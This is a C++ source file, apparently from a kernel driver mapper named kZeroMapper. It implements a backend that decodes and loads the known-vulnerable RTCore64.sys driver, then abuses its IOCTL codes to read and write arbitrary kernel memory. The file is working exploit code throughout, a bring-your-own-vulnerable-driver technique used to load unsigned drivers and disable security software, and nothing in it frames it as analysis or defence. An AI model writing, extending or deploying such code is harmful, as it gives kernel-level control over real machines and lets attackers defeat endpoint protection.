#include <kZeroMapper/kZeroMapperConfig.h>

#if defined(KZEROMAPPER_ENABLE_RTCORE64)

#include "RTCore64Backend.h"
#include "../Common/VulnerableDriverLoader.h"
#include "RTCore64_sys.h"
#include <algorithm>

std::string RTCore64Backend::Name( ) const
{
	return pstra( "RTCore64" );
}

NTSTATUS RTCore64Backend::Load( )
{
	const auto status = KernelRwCallBackend::Load( );

	if ( status != STATUS_SUCCESS )
		return status;

	if ( !m_NtUserSetGestureConfigRef )
	{
		LOG_SEC( "[-] - [RTCore64] NtUserSetGestureConfig_ref not found" );
		return 0x9170;
	}

	return STATUS_SUCCESS;
}

NTSTATUS RTCore64Backend::LoadDevice( )
{
	auto image = Tools::DecodePEBuffer( RTCore64_sys, sizeof( RTCore64_sys ) );

	return DropLoadAndOpenMapperDriver( Name( ).c_str( ), pstrw( L"\\\\.\\RTCore64" ), image.data( ), image.size( ), &m_Device, 0x9150 );
}

NTSTATUS RTCore64Backend::UnloadDevice( )
{
	CloseMapperDevice( &m_Device );
	return UnloadMapperDriver( );
}

bool RTCore64Backend::ReadMemory( uint64_t address, void* buffer, size_t size )
{
	auto out = r_cast<uint8_t*>( buffer );
	size_t offset = 0;

	while ( offset < size )
	{
		uint32_t value = 0;
		const auto chunk = s_cast<uint32_t>( std::min<size_t>( 4, size - offset ) );

		if ( !ReadPrimitive( address + offset, chunk, &value ) )
			return false;

		memcpy( out + offset, &value, chunk );
		offset += chunk;
	}

	return true;
}

bool RTCore64Backend::WriteMemory( uint64_t address, const void* buffer, size_t size )
{
	auto in = r_cast<const uint8_t*>( buffer );
	size_t offset = 0;

	while ( offset < size )
	{
		uint32_t value = 0;
		const auto chunk = s_cast<uint32_t>( std::min<size_t>( 4, size - offset ) );

		memcpy( &value, in + offset, chunk );

		if ( !WritePrimitive( address + offset, chunk, value ) )
			return false;

		offset += chunk;
	}

	return true;
}

bool RTCore64Backend::ReadPrimitive( uint64_t address, uint32_t size, uint32_t* value )
{
	MemoryOperation operation {};
	operation.address = address;
	operation.size = size;

	if ( !DeviceIoControl( m_Device, 0x80002048, &operation, sizeof( operation ), &operation, sizeof( operation ), nullptr, nullptr ) )
		return false;

	*value = operation.data;
	return true;
}

bool RTCore64Backend::WritePrimitive( uint64_t address, uint32_t size, uint32_t value )
{
	MemoryOperation operation {};
	operation.address = address;
	operation.size = size;
	operation.data = value;

	return DeviceIoControl( m_Device, 0x8000204C, &operation, sizeof( operation ), &operation, sizeof( operation ), nullptr, nullptr ) != FALSE;
}

#endif // KZEROMAPPER_ENABLE_RTCORE64

